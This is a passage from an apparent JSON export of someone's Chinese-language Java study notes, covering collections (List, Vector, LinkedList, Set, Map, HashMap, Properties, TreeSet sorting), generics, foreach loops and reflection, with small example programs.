java.util.Iterator;  \nimport java.util.List;  \n  \npublic class Test05 {  \n    public static void main(String[] args) {  \n        //创建list集合  \n        List l=new ArrayList();  \n    //    添加元素  \n        l.add(132);  \n        l.add(\"fds\");  \n        l.add(132);  \n        l.add(0,\"jfks\");  \n        Iterator it=l.iterator();  \n        System.out.println(\"遍历=======\");  \n        while (it.hasNext()){  \n            System.out.println(it.next());  \n         /*   Object o=it.next();  \n            System.out.println(o);*/  \n      /*  //    根据下标获取元素  \n            System.out.println(l.get(0));*/        }  \n        System.out.println(\"获取指定对象第一次出现的索引==========\");  \n        //System.out.println(l.size());  \n        System.out.println(l.indexOf(132));  \n        //System.out.println(l.get(1));  \n        System.out.println(\"获取对象最后一次出现的索引====\");  \n        System.out.println(l.lastIndexOf(132));  \n  \n        System.out.println(\"修改特定位置的元素=====\");  \n        l.set(0,\"修改后的0\");  \n  \n        it=l.iterator();  \n        while (it.hasNext()){  \n            System.out.println(it.next());  \n        }  \n    }  \n}\n```\nouput\n\t![[../../../../assets/Pasted image 20220729154306.png]]","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/2309_ArrayList%E5%92%8CVector":{"title":"2309_ArrayList和Vector","content":"# 2309_ArrayList和Vector\n|属性|ArrayList|Vector|\n|--|--|--|\n|默认容量|10|10\n|扩容容量|1.5倍|2倍|\n|底层|数组|数组|\n|底层|非线程安全|线程安全|\n|优点|检索快|增删快|\n\n\n怎么得到一个线程安全的List：\nCollections.synchronizedList(list);","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/2310_LinkedList%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8":{"title":"2310_LinkedList双向链表","content":"# 2310_LinkedList双向链表\n# 特点\n1. LinkedList没有初始化容量，最初的链表中first和last都是null\n2. **增删效率高**\n3. 不能通过数学表达式计算被查找元素的内存地址，每一次查找都是从头节点开始遍历\n\n```java\nimport javax.swing.event.TreeWillExpandListener;  \nimport java.util.Iterator;  \nimport java.util.LinkedList;  \nimport java.util.List;  \n  \npublic class Test08 {  \n    /*  \n    链表  \n     */    public static void main(String[] args) {  \n        List l1=new LinkedList();  \n        l1.add(1);  \n        l1.add(2);  \n        l1.add(\"c\");  \n        l1.add(\"D\");  \n  \n        for (int i = 0; i \u003cl1.size() ; i++) {  \n            System.out.println(l1.get(i));  \n        }  \n  \n        System.out.println(\"代进行访迭问\\n\");  \n        Iterator it=l1.iterator();  \n        while (it.hasNext()){  \n            System.out.println(it.next());  \n        }  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220729200248.png]]","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/2311_LinkedList":{"title":"2311_LinkedList","content":"# 2311_LinkedList\n\t需要做的：\n\t1. [ ] 手写linkedlist数据结构\n\t2. [ ] 其优点与缺点\n\t3. [ ] 转换成线程安全的方法colllections工具类里面的sync\n\t4. [ ] 泛型机制\n\t5. [ ] 类型自动推断：钻石表达式","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/2311_Vector":{"title":"2311_Vector","content":"# 2311_Vector\n1. 底层是数组\n2. 默认容量10，扩容2倍（ArrayList扩容是1.5倍）\n3. 线程安全，但是效率会低\n4. 可以采用`Collections.synchronizedList(ArrayList);`的方法将ArrayList转换为Vector的线程安全\n\n```java\nimport java.util.*;  \n  \npublic class Test09 {  \n    public static void main(String[] args) {  \n        List v=new Vector();  \n    //    添加元素  \n        v.add(123);  \n        v.add(23);  \n        v.add(\"dsa\");  \n        v.add(235);  \n        v.add(235);  \n        v.add(235);  \n        v.add(235);  \n        v.add(235);  \n        v.add(235);  \n        v.add(235);  \n        //默认容量10，满了之后，扩容是成倍，就是20  \n        v.add(235);  \n        v.add(235);  \n  \n        System.out.println(\"迭代器遍历\");  \n        Iterator it=v.iterator();  \n        while (it.hasNext()){  \n            System.out.println(it.next());  \n        }  \n        //非线程安全转线程安全  \n        List l=new ArrayList();  \n        //ArrayList是非线程安全的，但是Vector是线程安全的  \n        Collections.synchronizedList(l);  \n        //现在就是线程安全的了,  \n        l.add(\"fjds\");  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220729201550.png]]\n\n","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/2312_HashSet%E5%92%8CTreeSet":{"title":"2312_HashSet和TreeSet","content":"# 2312_HashSet和TreeSet\n1. 两个set存入的数据都不会重复\n2. TreeSet存入的数据会自动排序，可排序集合\n3. TreeSet无序可排序，无序值得是存进去和取出来的数据顺序不一样\n\n```java\nimport java.util.HashSet;  \nimport java.util.Set;  \nimport java.util.TreeSet;  \n  \npublic class Test {  \n    public static void main(String[] args) {  \n        Set\u003cString\u003e s=new HashSet\u003c\u003e();  \n        s.add(\"d\");  \n        s.add(\"b\");  \n        s.add(\"c\");  \n        s.add(\"c\");  \n        s.add(\"c\");  \n        s.add(\"b\");  \n        s.add(\"o\");  \n        for (String string:s  \n             ) {  \n            System.out.println(string);  \n        }  \n        System.out.println(\"TreeSet=========\");  \n        Set\u003cString\u003e s2=new TreeSet\u003c\u003e();  \n        s2.add(\"b\");  \n        s2.add(\"c\");  \n        s2.add(\"a\");  \n        for (String string:s2  \n             ) {  \n            System.out.println(string);  \n        }  \n    }  \n}\n```\n![[../../../../assets/Pasted image 20220730094458.png]]","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/2313_Map%E6%8E%A5%E5%8F%A3%E7%9A%84%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95":{"title":"2313_Map接口的常用方法","content":"# 2313_Map接口的常用方法\n```java\nimport java.util.*;\n\npublic class Test {\n    public static void main(String[] args) {\n        //创建hashmap集合\n        Map\u003cInteger,String\u003e m=new HashMap\u003c\u003e();\n    //    添加键值对\n        m.put(1,\"zhangsan\");\n        m.put(1,\"lisi\");//不能有重复的key，但是可以有重复的值,重新put会更新之前的值\n        m.put(2,\"lisi\");\n    //    get获取value\n        String s=m.get(1);\n        System.out.println(s);\n    //size（）集合的大小\n        System.out.println(m.size());\n/*    //    clear（） 清空集合\n        m.clear();\n        System.out.println(m.size());*/\n\n        //是否包含某个键，某个值\n        System.out.println(m.containsKey(2));\n        System.out.println(m.containsValue(\"lisi\"));\n        System.out.println(m.containsValue(\"lis\"));\n        //判断是否为空\n        System.out.println(\"是否为空\"+m.isEmpty());\n\n        //keySet获取key组成的集合\n        Set\u003cInteger\u003e set=new HashSet();\n        set=m.keySet();\n        for (Integer i:set\n             ) {\n            System.out.println(i);\n        }\n\n        //remove通过key删除键值对\n        System.out.println(\"key:1 value:  \"+m.get(1));\n        m.remove(1);\n        System.out.println(m.containsKey(1));\n        m.put(45,\"fsd\");\n\n        //values（）返回一个collection类型的value的集合\n        Collection\u003cString\u003e s1=new ArrayList\u003c\u003e();\n        s1=m.values();\n        for (String string:s1\n             ) {\n            System.out.print(string+\" \");\n        }\n\n        //entrySet() 方法返回映射中包含的映射的 Set 视图。\n        System.out.println(\"映射关系\"+m.entrySet());\n    }\n}\n```\n\n![](../assets/4cba5e3d7f8241d89f46210c0057d10b.png)\n","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/2314_Map%E7%9A%84%E4%B8%A4%E7%A7%8D%E9%81%8D%E5%8E%86%E6%96%B9%E5%BC%8F":{"title":"2314_Map的两种遍历方式","content":"# 2314_Map的两种遍历方式\n# Map的两种遍历\n\nCreated: July 30, 2022 4:56 PM Tags: 遍历 类别: Map\n```java\nimport java.nio.channels.InterruptedByTimeoutException;  \nimport java.util.HashMap;  \nimport java.util.Iterator;  \nimport java.util.Map;  \nimport java.util.Set;  \n​  \npublic class Teset04 {  \n    public static void main(String[] args) {  \n        //创建map集合  \n        Map\u003cInteger,String\u003e m=new HashMap\u003c\u003e();  \n        //添加键值对  \n        m.put(2,\"lier\");  \n        m.put(3,\"wangsan\");  \n        m.put(4,\"zhangsi\");  \n        m.put(5,\"wangwu\");  \n        m.put(0,\"zero\");  \n        //    第一种遍历方式，通过获取key机场，获取key值对应的value  \n        Set\u003cInteger\u003e set1=m.keySet();  \n        //    迭代器  \n        Iterator\u003cInteger\u003e it1=set1.iterator();  \n        //    进行迭代  \n        while (it1.hasNext()){  \n            Integer key=it1.next();  \n            String value=m.get(key);//通过key获取value  \n            System.out.println(\"key: \"+key+\" value: \"+value);  \n​  \n        }  \n​  \n    //    第二种方式，通过Map.EntrySet,返回的set  \n        System.out.println(\"Map.EntrySet的方式，获取node节点对象，然后取出getkey和getvalue属性值\");  \n        Set\u003cMap.Entry\u003cInteger,String\u003e\u003e set2=m.entrySet();  \n    //    迭代器  \n        Iterator\u003cMap.Entry\u003cInteger,String\u003e\u003e it2=set2.iterator();//泛型要和上面的保持一致，可以不写的话，里面就是object类型  \n    //    迭代  \n        while (it2.hasNext()){  \n            Map.Entry\u003cInteger,String\u003e node=it2.next();  \n            Integer key=node.getKey();//getkey获取键  \n            String value=node.getValue();  \n            System.out.println(\"key: \"+key+\"value: \"+value);  \n        }  \n    //    此方式更适合大数据量，因为直接从node获取的key和value  \n        System.out.println(\"Map.EntrySet改用foreach遍历============\");  \n    //    以下改为foreach采用这种方式  \n        for (Map.Entry\u003cInteger,String\u003e node:set2  \n             ) {  \n            System.out.println(\"key:\"+node.getKey()+\" value: \"+node.getValue());  \n        }  \n​  \n    }  \n}\n```\n\n![](../assets/b4271bfb0c204395a0a541fec8ef4bff.png)","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/2315_HashMap":{"title":"2315_HashMap","content":"# 2315_HashMap\n# HashMap\n\nCreated: July 30, 2022 5:18 PM\nTags: 实现原理\n类别: HashMap\n\n![](../assets/b0568aa203f845f4a2ae70c90d1ccf01.png)\n\n内存图\n\n# 简述\n\nHashMap：**加载因子0.75，默认容量16，初始化容量必须是2的倍数**\n\n\u003caside\u003e\n💡 HashMap类似于由**单向链表组成的数组\n数据结构：哈希表**\n\n\u003c/aside\u003e\n\n# 哈希表的特点：\n\n结合了数组和链表各自的优点，相当于由一个个单向链表组成的数组\n\n链表：增删快，查找效率低\n\n数组：查找快，增删效率低，末节点的增删不受影响\n\n但是各自的优点没有完全，增删比不上链表，查找比不上数组\n\n# HashMap的`map.put(k,v)`方法`实现原理`\n\n1. 将k和v进行封装到node对象中\n2. 调用`hashCode()`方法，转换成数组下标，然后在这个下标中查看是否有链表\n    1. 如果没有，就把这个node放到这个位置\n    2. 如果有，就使用`equals()`方法就在这个里面比对k值的node，看看有没有一样的。如果没有一样的k，就添加到末尾；如果有，就更新它的`value`\n\n# HashMap的`map.get(k)`方法`实现原理`\n\n1. 和put类似，将k值使用`hashCode()`计算哈希值，通过哈希算法转换数组下标\n2. 通过数组下标快速找到这个node位置\n    1. 如果没有，就返回`null`\n    2. 如果有，就使用`equals`方法去比对k值，找到之后，拿出value值\n\n# HashMapp注意事项\n\n1. `equals`是`get`和put时都会使用到的方法，所以需要注意重写`equals()`方法，同时需要重写`hashCode()`方法[HashSet重写equals和hashCode方法](HashSet%E9%87%8D%E5%86%99equals%E5%92%8ChashCode%E6%96%B9%E6%B3%95%20c296142fac8f49e4b3ba38b622c32307.md) \n2. 是通过`hashCode()`**方法去获取node下标的**\n3. 如果将`hashCode()`方法的返回值设置为固定值，那么HashMap的底层哈希表数据结构编程纯**单向链表（**当每个单向链表上的节点数量差异过大时，称为“**散列分布不均匀**”）\n4. 当某个单向链表的**节点超过8**，那么这个单向链表的数据结构就会变成**红黑树；**如果节点**再次少于6**，就会变回单向链表","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/2316_HashSet%E9%87%8D%E5%86%99equals%E5%92%8ChashCode%E6%96%B9%E6%B3%95":{"title":"2316_HashSet重写equals和hashCode方法","content":"# 2316_HashSet重写equals和hashCode方法\n# HashSet重写equals和hashCode方法\n\n```java\nimport java.util.*;\n\npublic class Test06 {\n    public static void main(String[] args) {\n        Student s1=new Student(\"zhangsan\");\n        Student s2=new Student(\"zhangsan\");\n        System.out.println(s2.equals(s1));\n        Set\u003cStudent\u003e set=new HashSet\u003c\u003e();\n        set.add(s1);\n        set.add(s2);\n        System.out.println(set.size());\n\n    }\n}\n\n/**\n * 学生\n */\nclass Student{\n    private String name;\n\n    public Student() {\n    }\n\n    public Student(String name) {\n        this.name = name;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n//重写equals和hasCode\n\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        Student student = (Student) o;\n        return Objects.equals(name, student.name);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(name);\n    }\n}\n```\n\n![](../../../../assets/Pasted%20image%2020220811215715.png)","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/2317_HashMap%E5%92%8CHashTable%E7%9A%84%E5%8C%BA%E5%88%AB":{"title":"2317_HashMap和HashTable的区别","content":"# 2317_HashMap和HashTable的区别\n1.  HashMap允许`key`为`null`，**HashTable不允许`key`和`value`为`null`**\n2.  HashTable有**线程安全**，但是对**线程处理效率低**，使用较少\n3.  HashTable的**初始化容量是11**，**默认加载因子0.75**（加载因子：当使用的容量达到这个比率就会进行扩容）；HashMap的初始化容量是16，默认加载因子也是0.75，当链表节点数量大于8，变成红黑树，小于6，变回单向链表\n4.  Hashtable的扩容：**原容量*2+1**","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/2318_Hashtable%E7%9A%84Properties%E5%B1%9E%E6%80%A7%E7%B1%BB":{"title":"2318_Hashtable的Properties属性类","content":"# 2318_Hashtable的Properties属性类\n帮助文档：[Properties](https://www.matools.com/file/manual/jdk_api_1.8_google/java/util/Properties.html)\n\n1.  Properties是一个Map集合，继承**Hashtable**，Properties的key和value都是`String`类型\n2.  被称为**属性类对象**\n\n# 两个基本的方法\n\n`setProperty()`相当于put，`getProperty()`相当于get\n\n```java\nimport java.util.Properties;\n\npublic class Test01 {\n    public static void main(String[] args) {\n/**\n         * properties基本的两个方法，存取\n*/\nProperties p1=new Properties();\n//存入数据，相当于是put\np1.setProperty(\"url\",\"www.baidu.com\");\n        p1.setProperty(\"name\",\"fskf\");\n        p1.setProperty(\"age\",\"16\");\n        p1.setProperty(\"acc\",\"acc16jksjf\");\n        p1.setProperty(\"pass\",\"rrewqtweqeet\");\n\n//通过key获取value\nSystem.out.println(p1.getProperty(\"acc\"));\n        System.out.println(p1.getProperty(\"name\"));\n        System.out.println(p1.getProperty(\"url\"));\n        System.out.println(p1.getProperty(\"namefs\"));//因为没有对应的key值，返回null\n}\n}\n\n```\n![](../../../../assets/Pasted%20image%2020220811215926.png)","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/2319_TreeSet%E5%85%B3%E4%BA%8E%E6%8E%92%E5%BA%8F%E5%AE%9E%E7%8E%B0comparable%E6%8E%A5%E5%8F%A3%E6%88%96%E4%BD%BF%E7%94%A8%E6%AF%94%E8%BE%83%E5%99%A8Compartor":{"title":"2319_TreeSet关于排序：实现comparable接口或使用比较器Compartor","content":"# 2319_TreeSet关于排序：实现comparable接口或使用比较器Compartor\n💡 Comparable和Comparator怎么选择呢？ 当**比较规则不会发生改变**的时候，或者说**当比较规则只有1个的时候，建议实现Comparable接口。**因为这个要去实现，没下面那个方便，下面那个方便，但是每次都要作为参数传进去 如果比较规则有多个，并且需要多个比较规则之间频繁切换，建议使用Comparator接口。\n\n\n# 第一种：实现comparable接口\n\n## 关于TreeSet自定义类的排序，书写代码时需要注意\n\n1.  继承`Comparable`接口\n2.  override compareTo``方法\n3.  有必要的话，把`toString`方法也override\n\n## `compareTo`的比较规则怎么写\n\n1.  通过对象的属性进行比较，比如是String，可以用它本身就实现了的compareTo去进行比较，返回的一个数值能够代表他的数值\n2.  通过数值大小比较\n3.  使用if结合起来比较\n4.  **无论怎么写，返回的都是一个数值**，通过这个数值进行比较，一般是**升序**\n\n## 原因\n\n1.  TreeSet中存入的数据会默认的排序，因为String和Integer都是默认实现了Comparable接口，对排序的规则已经进行了一定，所以不用再写了。\n2.  但是，别的自己定义的类，没有定义规则，所以需要实现`Comparable`接口，不然无法排序，添加节点元素就会报错`Customer cannot be cast to java.lang.Comparable`\n\n```java\nimport java.util.TreeSet;\n\npublic class Test02 {\n    public static void main(String[] args) {\n\n//创建TreeSet\nTreeSet\u003cCustomer\u003e set=new TreeSet\u003c\u003e();\n//添加节点元素\n\t\tset.add(new Customer(\"zhangsan\",17));\n        set.add(new Customer(\"zhangsan1\",17));\n        set.add(new Customer(\"wangmazi\",16));\n        set.add(new Customer(\"haiya\",15));\n\n//遍历\nfor (Customer c:set\n             ) {\n            System.out.println(c);\n        }\n    }\n}\nclass Customer implements Comparable\u003cCustomer\u003e{\n    private String name;\n    private int age;\n\n    public Customer() {\n    }\n\n    public Customer(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n/**\n     *\n     * @paramothe object to be compared.\n     * @return返回数字表示这个set的排序方式：先根据年龄，再根据姓名排序\n*/\n@Override\n    public int compareTo(Customer o) {\n        if (this.age==o.age){\n            return this.name.compareTo(o.name);\n\n        }else{\n            return this.age-o.age;//返回一个数值，可以表示顺序的排列，如果大于0，就排在右子树，小于0，就在左子树\n\n}\n    }\n\n//重写toString方法，方便输出对象的值，这样就不是hashCode值了\n@Override\n    public String toString() {\n        return \"name:\"+name+\"\\\\tage:\"+age;\n    }\n}\n```\n\n![](../../../../assets/Pasted%20image%2020220811220231.png)\n\n# 第二种：传一个比较器\n\n```java\nimport com.sun.media.sound.SoftTuning;\n\nimport java.util.Comparator;\nimport java.util.TreeSet;\n\npublic class Test {\n    public static void main(String[] args) {\n/*        TreeSet\u003cWugui\u003e set=new TreeSet\u003c\u003e(new WuguiComparator());*/\n\n        //采用匿名内部类传入一个比较器\nTreeSet\u003cWugui\u003e set=new TreeSet\u003c\u003e(new Comparator\u003cWugui\u003e() {\n            @Override\n            public int compare(Wugui o1, Wugui o2) {\n                return o1.age-o2.age;\n            }\n        });\n//添加节点\nset.add(new Wugui(12));\n        set.add(new Wugui(18));\n        set.add(new Wugui(14));\n        for (Wugui w:set\n             ) {\n            System.out.println(w);\n        }\n    }\n}\nclass Wugui{\n    int age;//默认，在本包或本类使用\n\npublic Wugui(int age) {\n        this.age = age;\n    }\n\n    @Override\n    public String toString() {\n        return \"小乌龟 \"+age+\"岁\";\n    }\n}\n/*\n\n*/\n/**\n *乌龟比较器，创建之后，在创建乌龟集合的时候，new一个把比较器作为参数放进去\n*//*\n\nclass WuguiComparator implements Comparator\u003cWugui\u003e{\n    @Override\n    public int compare(Wugui o1, Wugui o2) {\n        return o1.age-o2.age;\n    }\n}*/\n\n```\n\n![](../../../../assets/Pasted%20image%2020220811220330.png)","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/2320_%E8%87%AA%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84":{"title":"2320_自平衡二叉树数据结构","content":"# 2320_自平衡二叉树数据结构\n# 自平衡二叉树数据结构\n\n原则：遵循**左小右大**\n\n存放的过程就是排序的过程，取出来就是顺序\n\n### 三种遍历方式\n\n顺序说的是根的位置\n\n1.  前序遍历：根左右\n2.  中序遍历：左根右 `TreeSet` / `TreeMap` / `Iterator`迭代器\n3.  后序遍历：左右根\n\n`TreeSet`和`TreeMap`采用的是**中序遍历**\n\n中序表达式画图的例子\n\n![](../../../../assets/Pasted%20image%2020220811220510.png)\n\n![](../../../../assets/Pasted%20image%2020220811220522.png)\n取出\n\n![](../../../../assets/Pasted%20image%2020220811220531.png)\n这个很离谱，但就是按照顺序取出来。在进阶237集","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/2321_Collections%E5%B7%A5%E5%85%B7%E7%B1%BB":{"title":"2321_Collections工具类","content":"# 2321_Collections工具类\n# 基本的使用\n\n```java\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\n\npublic class Test03 {\n    public static void main(String[] args) {\n        List\u003cWugui2\u003e list=new ArrayList\u003c\u003e();\n//arrayList是非线程安全的，使用了collection工具类中的synchronizedList方法之后，就能变成线程安全的\nCollections.synchronizedList(list);\n        list.add(new Wugui2(12));\n        list.add(new Wugui2(64));\n        list.add(new Wugui2(45));\n//排序，如果不是string等已经实现了comparable接口的类，需要重新写实现\nCollections.sort(list);\n        for (Wugui2 w:list\n             ) {\n            System.out.println(w);\n        }\n    }\n}\nclass Wugui2 implements Comparable\u003cWugui2\u003e{\n    int age;//默认，在本包或本类使用\n\npublic Wugui2(int age) {\n        this.age = age;\n    }\n\n    @Override\n    public String toString() {\n        return \"小乌龟 \"+age+\"岁\";\n    }\n\n    @Override\n    public int compareTo(Wugui2 o) {\n        return this.age-o.age;\n    }\n}\n```","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/241_%E6%B3%9B%E5%9E%8B":{"title":"241_泛型","content":"# 241_泛型\n1. 泛型这种语法机制，只在程序编译阶段起作用，只是给编译器参考的。\n2. 编译器规范了集合的中存储数据的类型，比如\u003cAnimal\u003e就只能存储animal\n3.  子类特有方法依旧需要向下转型\n4. 泛型**必须是引用数据类型**，不能是基本数据类型\n\n```java\nimport com.sun.org.apache.xpath.internal.WhitespaceStrippingElementMatcher;  \n  \nimport java.util.ArrayList;  \nimport java.util.Iterator;  \nimport java.util.List;  \n  \npublic class Test01 {  \n    public static void main(String[] args) {  \n        //不使用泛型  \n        List l=new ArrayList();  \n        Cat c=new Cat();  \n        Bird b=new Bird();  \n    //    添加对象到集合  \n        l.add(c);  \n        l.add(b);  \n  \n\t    //    遍历集合，取出每个动物的move  \n        Iterator it=l.iterator();//迭代器  \n        while (it.hasNext()){  \n            Object obj=it.next();//没有使用泛型就只能使用Object，取出来就是Object  \n  \n        //因为是animal的方法，所以需要转型  \n            if (obj instanceof Animal){  \n                Animal a=(Animal) obj;  \n                ((Animal) obj).move();//调用父类的方法  \n            }  \n        }  \n  \n    //    使用泛型  \n        List\u003cAnimal\u003e l2=new ArrayList\u003c\u003e();//砖石操作符中的类型可以省略  \n    //    添加元素  \n        l2.add(c);  \n        l2.add(b);  \n    //    遍历  \n        Iterator\u003cAnimal\u003e it2=l2.iterator();  \n        while (it2.hasNext()){  \n            //使用了泛型之后，就是animal了  \n            Animal a=it2.next();  \n            a.move();  \n            System.out.println(\"使用子类中特有的方法,仍然需要向下转型\");  \n            if (a instanceof Bird){  \n                Bird bird=(Bird)a;  \n                bird.fly();  \n            }else if (a instanceof Cat){  \n                Cat cat=(Cat)a;  \n                cat.catchMouse();  \n            }  \n        }  \n    }  \n}  \n  \nclass Animal{  \n    public void move(){  \n        System.out.println(\"动物在移动\");  \n    }  \n}  \nclass Cat extends Animal{  \n    public void catchMouse(){  \n        System.out.println(\"猫抓老鼠\");  \n    }  \n}  \n  \nclass Bird extends Animal{  \n    public void fly(){  \n        System.out.println(\"鸟儿飞翔\");  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220729210814.png]]","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/242_%E6%B3%9B%E5%9E%8B%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%BF%E7%94%A8":{"title":"242_泛型方法的使用","content":"# 242_泛型方法的使用\n\n\n定义\n1. 定义方法时同时定义了泛型的方法就是泛型方法\n2. 泛型方法的格式\n```java\npublic \u003cT\u003e void show(T name){\n方法体;\n}\n```\n\n## 实例\n```java\npackage test;  \n  \npublic class Test02 {  \n    public static void main(String[] args) {  \n        String[] strings={\"linsa\",\"kanda\",\"ondel\",\"enter\"};  \n        Integer[] integers={2,34,53,5353,53};  \n    //    使用函数进行打印  \n        printArrs(strings);  \n        printArrs(integers);  \n    }  \n  \n    /**  \n     * 打印任意类型数组的所有元素  \n     *  \n     * @param arrs 泛型的数组  \n     */  \n    public static \u003cT\u003e void printArrs(T[] arrs){  \n        if (arrs!=null){  \n            StringBuilder sb=new StringBuilder(\"[\");  \n            for (int i = 0; i \u003carrs.length; i++) {  \n                sb.append(arrs[i]).append(i==arrs.length-1?\"\":\",\");  \n            }  \n            sb.append(\"]\");  \n            System.out.println(sb);  \n        }else {  \n            System.out.println(arrs);  \n        }  \n        }  \n  \n}\n```\noutput\n```java\n[linsa,kanda,ondel,enter]\n[2,34,53,5353,53]\n```\n\n其他：泛型约束\n\n## 通配符？\n案例：极品飞车比赛\nCar的子类benzs是子类关系\n但是Array\u003ccar\u003e和Array\u003cbenzs\u003e没有关系\n所以如果是对于array类的方法`go()`进行比赛的时候，就需要通过`?`来作为方法体的泛型形参类型，否则就无法参加比赛\n```java\npublic static void go(ArrayList\u003c?\u003e cars){\n}\n```","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/25_foreach":{"title":"25_foreach","content":"# 25_foreach\n缺点：没有下标，不能及时反馈下标\n语法结构\n```java\nFor(数据类型 元素：数组或者集合\n   ){\n   带元素的语句;\n   }\n```\n\n# eg基本使用\n```java\npublic class Test02 {  \n    public static void main(String[] args) {  \n        int[] arr1={3,45,45,6,4,31,1,31,3,13,13};  \n        for (int num:arr1  \n             ) {  \n            System.out.println(num);  \n        }  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220729211711.png]]\n\n# eg各种遍历\n```java\nimport java.util.ArrayList;  \nimport java.util.Iterator;  \nimport java.util.List;  \n  \npublic class ForeachTest01 {  \n    public static void main(String[] args) {  \n        List\u003cString\u003e l=new ArrayList\u003c\u003e();//泛型  \n        l.add(\"a\");  \n        l.add(\"b\");  \n        l.add(\"c\");  \n        l.add(\"d\");  \n        System.out.println(\"使用foreach遍历=======\");  \n        for (String s:l  \n             ) {  \n            System.out.println(s);  \n        }  \n        System.out.println(\"使用for循环遍历============\");  \n        for (int i = 0; i \u003cl.size() ; i++) {  \n            System.out.println(l.get(i));  \n        }  \n        System.out.println(\"使用迭代器进行遍历========\");  \n        Iterator\u003cString\u003e it=l.iterator();//泛型  \n        while (it.hasNext()){  \n            String s=it.next();  \n            System.out.println(s);  \n        }  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220730092946.png]]","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/2801_%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6":{"title":"2801_反射机制","content":"# 2801_反射机制\n\n\nCreated: August 8, 2022 9:23 PM\nDate: August 8, 2022\n类别: 反射机制\n\n包类：`java.lang.reflect.*`\n\n作用：**操作字节码文件**\n\n- 相关的重要类\n    1. java.lang.Class 代表整个字节码，整个类型\n    2. java.lang.reflect.Method 代表字节码中的方法字节码\n    3. java.lang.reflect.Constructor 代表字节码中的构造方法字节码\n    4. java.lang.reflect.Field 代表字节码中的属性字节码，代表类中的成员变量\n    \n\n## 获取字节码文件的三种方法\n\n1. 使用静态方法`Class.forName()`\n    1. 参数是包名字符串 ，比如`java.lang.String`\n    2. 赋值给Class对象\n    3. 这种方法会导致类中的**静态代码块**执行\n2. 使用`对象.getClass()`方法获取\n3. 使用`类名.class`获取，包括基本类型也可以采用这种方式\n\n```java\nimport java.util.Date;\n\npublic class Test01 {\n    public static void main(String[] args) {\n        Class c1=null;\n        Class c2=null;\n//Class.forName()静态方法获取字节码文件\ntry {\n            c1=Class.forName(\"java.lang.String\");//String的字节码文件\nc2=Class.forName(\"java.util.Date\");//Date类型的字节码文件\n} catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n\n//java对象的getClass（）方法\nString s=\"abc\";\n        Class s1=s.getClass();\n        System.out.println(s1==c1);//所指向的都是String字节码文件，同一个内存地址，返回true\n\nDate time=new Date();\n        Class t1=time.getClass();//获取time对象所指向的class字节码文件 java.util.Date\nSystem.out.println(t1==c2);\n        int i=3;\n\n//任何一种数据类型，包括基本数据类型，都有.class属性\nClass c3=int.class;\n        Class c4=Date.class;\n        System.out.println(c4==c2);\n        System.out.println(c4==t1);\n    }\n}\n\n```\n\n![Untitled](../../../../assets/Untitled%204.png)\n\n## 反射机制的灵活性：通过修改配置文件实例化不同类型的对象\n\n创建配置文件\n\n![Untitled](../../../../assets/Untitled%201%202.png)\n\n通过修改配置文件，可以实例化不同的对象，为了方便查看结果，配置文件放了两个类包名\n\n```java\nimport java.io.FileNotFoundException;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.io.Reader;\nimport java.util.Properties;\n\npublic class Test {\n    public static void main(String[] args) throws Exception {\n//读取配置文件,获取要创建的对象类型包名\nString name, name2;\n        FileReader reader = new FileReader(\"ReflectTest/src/com/reflect/test/配置.properties\");\n        Properties p1 = new Properties();\n        p1.load(reader);\n        reader.close();//关闭字符流\nname = p1.getProperty(\"classname\");\n        name2 = p1.getProperty(\"classname2\");\n        System.out.println(\"所创建的包类---\" + name);\n//获取字节码文件\nClass c1 = Class.forName(name);\n        Class c2 = Class.forName(name2);\n\n//无参数 反射机制创建对象\nObject o1 = c1.newInstance();\n        Object o2 = c2.newInstance();\n\n        System.out.println(o1);\n        System.out.println(o2);\n\n    }\n}\n\n```\n\n## Class.forNmae()会导致静态代码块执行\n\n```java\npublic class Test03 {\n    public static void main(String[] args) throws Exception {\n        Class.forName(\"Test03Test\");\n    }\n}\nclass Test03Test{\nstatic {\n    System.out.println(\"静态代码块执行了\");\n}\n}\n```\n\n![Untitled](../../../../assets/Untitled%202%201.png)\n\n## eg1 常用的使用方法\n\n```java\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Modifier;\n\npublic class Test06 {\n    public static void main(String[] args) throws Exception {\n        //    获取整个类\n        Class student = Class.forName(\"com.reflect.test.Student\");\n        System.out.print(\"\\n完整类名:\" + student.getName());\n        System.out.print(\"\\n简单类名:\" + 